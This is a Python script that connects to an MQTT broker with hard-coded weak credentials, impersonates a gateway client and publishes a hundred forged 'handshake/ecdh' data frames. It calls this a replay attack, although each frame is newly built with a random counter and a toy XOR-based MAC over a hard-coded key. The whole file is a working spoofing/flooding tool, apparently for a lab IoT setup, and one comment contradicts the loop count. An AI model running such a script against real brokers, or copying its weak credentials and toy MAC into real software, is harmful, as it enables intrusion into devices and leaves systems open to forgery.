import paho.mqtt.client as mqtt
import time
import struct
import random
from binascii import hexlify


BROKER_ADDRESS = "192.168.1.7"  
BROKER_PORT = 1885
TOPIC = "handshake/ecdh"
USERNAME = "admin"  
PASSWORD = "123"  


def compute_mac(counter, private_key):
    t_high = (counter >> 32) & 0xFFFFFFFF 
    t_low = counter & 0xFFFFFFFF           
    t_low_rotated = ((t_low << 7) | (t_low >> (32 - 7))) & 0xFFFFFFFF  
    t_high_rotated = ((t_high >> 11) | (t_high << (32 - 11))) & 0xFFFFFFFF  
    a = t_high ^ t_low_rotated
    b = t_low ^ t_high_rotated
    mac_intermediate = (a << 32) | b
    final_mac = mac_intermediate ^ private_key
    return final_mac

def create_data_frame():
    preamble = 0xAA55  
    identifier_id = 0x8110910 
    sequence_number = random.randint(0, 65535)
    packet_type = 0x01
    nonce = random.getrandbits(128) 
    payload = b'A' * 20  
    payload_length = len(payload)  
    encrypted_payload = payload  
    counter = random.getrandbits(64)  
    private_key = 0xDEADBEEF12345678  
    mac = compute_mac(counter, private_key)  
    end_marker = 0xAABB

    data_frame = (
        struct.pack("<H", preamble) +  
        struct.pack("<I", identifier_id) +  
        struct.pack("<B", packet_type) + 
        struct.pack("<H", sequence_number) +  
        struct.pack(">QQ", nonce >> 64, nonce & 0xFFFFFFFFFFFFFFFF) +
        struct.pack(">H", payload_length) +
        encrypted_payload +
        struct.pack(">Q", mac) +
        struct.pack(">H", end_marker)
    )
    return data_frame

def send_data_frame_mqtt(data_frame, client):
    print("Data Frame (hex):", hexlify(data_frame).decode())
    client.publish(TOPIC, data_frame)
    print(f"Sent Data Frame to topic '{TOPIC}'")

def replay_attack_mqtt():
    try:
        client = mqtt.Client(client_id="GatewayClient", callback_api_version=mqtt.CallbackAPIVersion.VERSION1)
    except TypeError:
        client = mqtt.Client(client_id="GatewayClient")

    client.username_pw_set(USERNAME, PASSWORD)

    try:
        client.connect(BROKER_ADDRESS, BROKER_PORT, 60)
        print("Connected to MQTT Broker successfully.")
    except Exception as e:
        print(f"Failed to connect to MQTT Broker: {e}")
        return 

    #replay the data frame 10 times
    for i in range (0, 100):
        print("Replaying the captured Data Frame...")
        data_frame = create_data_frame()
        send_data_frame_mqtt(data_frame, client)
        time.sleep(0.1)
    
    client.disconnect()
    print("Disconnected from MQTT Broker.")

if __name__ == "__main__":
    replay_attack_mqtt()